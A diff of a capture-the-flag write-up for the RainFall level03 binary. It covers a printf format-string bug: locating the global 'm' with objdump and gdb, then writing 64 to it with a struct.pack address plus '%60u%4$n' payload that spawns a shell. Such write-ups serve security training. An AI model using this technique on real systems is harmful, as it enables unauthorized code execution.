@@ -1,8 +1,11 @@
 # Level 03
 
+
 ## Analysis
 
-We started to play with binary, it seems to read on stdin and print on stdout the string we passed.
+## Attack type: printf exploitation
+
+We started to analyze the binary, and it appears to read from stdin and print to stdout the string we provided.
 
 ```bash
 level3@RainFall:~$ ./level3
@@ -10,7 +13,7 @@ test
 test
 ```
 
-After few random test we notice that program seems to doesn't segfault with a lot of char
+After a few random tests, we noticed that the program does not seem to segfault with a large number of characters.
 
 ```bash
 level3@RainFall:~$ ./level3
@@ -18,7 +21,7 @@ level3@RainFall:~$ ./level3
 0xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde0000xb7fde000
 ```
 
-We decompile binary with ghidra. We understood thats fgets function was protected but we found that printf is used with the user input we passed.
+We decompiled the binary with Ghidra. We understood that the fgets function was protected, but we found that printf is used with the user input we provided.
 
 For example:
 ```bash
@@ -27,11 +30,11 @@ level3@RainFall:~$ ./level3
 0x200 0xb7fd1ac0 0xb7ff37d0 0x25207025 0x70252070
 ```
 
-We can use user input to print addresses from stack. Another things we found, is that there is call system to execute `/bin/sh` but it depend from global variable named `m`, and if this variable is equal to `64`, it create a shell.
+We can use user input to print addresses from the stack. Another thing we found is that there is a call to the system to execute `/bin/sh`, but it depends on the global variable named `m`. If this variable is equal to `64`, it creates a shell.
 
-From this information we search a way to modify `m` variable from printf call.
+From this information, we searched for a way to modify the `m` variable using the printf call.
 
-Few documentation where we learn how to perform this attack
+Here are a few resources where we learned how to perform this attack:
 https://owasp.org/www-community/attacks/Format_string_attack
 https://www.it.uc3m.es/pbasanta/asng/course_notes/input_output_printf_en.html
 https://www.youtube.com/watch?v=0WvrSfcdq1I
@@ -40,9 +43,9 @@ https://infosecwriteups.com/expdev-exploit-exercise-protostar-format-3-33e8d8f1e
 https://airman604.medium.com/protostar-format-4-walkthrough-b8f73f414e59
 https://failingsilently.wordpress.com/2016/12/22/exploit-exercises-protostar/
 https://mislusnys.github.io/post/2016-06-26-protostar-format-string-levels/
-And many.. many.. many more
+And many more.
 
-So we learned that this is possible to perform writing data at arbitrary address with usage of [%n](https://www.it.uc3m.es/pbasanta/asng/course_notes/input_output_printf_en.html). But we need the address of global variable to do it, so let's go to find it.
+We learned that it is possible to write data to an arbitrary address using the [%n](https://www.it.uc3m.es/pbasanta/asng/course_notes/input_output_printf_en.html) format specifier. But we need the address of the global variable to do it, so let's find it.
 
 ```bash
 level3@RainFall:~$ objdump -t  level3 | grep m
@@ -63,7 +66,7 @@ level3:     file format elf32-i386
 0804851a g     F .text	0000000d              main
 ```
 
-We need also the position of format string to print store the global variable address (`0804988c`). It will be used later with %n as reference for writing data. We used pattern 'AAAA' to see where it stored and gdb to print stack.
+We also need the position of the format string to store the global variable address (`0804988c`). It will be used later with %n as a reference for writing data. We used the pattern 'AAAA' to see where it is stored and used gdb to print the stack.
 
 ```bash
 (gdb) disassemble v
@@ -113,8 +116,9 @@ Breakpoint 1, 0x080484d5 in v ()
 0xbffff560:     0x00000000      0x00000000      0x00000000      0x00000000
 0xbffff570:     0x00000000      0xb7fe765d      0xb7e3ebaf      0x080482bb
 ```
+## Exploitation
 
-And now we get this address where 'AAAA' is store: `0xbffff510`. And we know that this address is at 4 space memory position from the stack pointer. Now let's build payload to override global variable. We created python script to write global variable instead of 'AAAA', so it will use 4 bytes to print this address, then we print 60 random char (any char will works), then we used %4$n to specify to printf that pointer used to write data is at 4 space memory from $esp.
+We found that 'AAAA' appears at a specific position in the stack during the printf call. To exploit this, we built a payload to overwrite the global variable m. We created a Python script that writes the address of m (0x0804988c) instead of 'AAAA'. The script uses 4 bytes to include this address, then prints 60 random characters (any characters will work), and finally uses %4$n to specify to printf that the pointer used to write data is at the correct argument position (which we determined to be the 4th argument on the stack) (printf argument).
 
 Here is the payload we used:
 ```bash
@@ -123,7 +127,6 @@ level3@RainFall:~$ (python -c 'import struct; print struct.pack("I", 0x804988c)+
 Wait what?!
 whoami
 level4
-
 level3@RainFall:~$ (python -c 'import struct; print struct.pack("I", 0x804988c)+"%60u"+"%4$n"'; cat) | ./level3
 �                                                         512
 Wait what?!
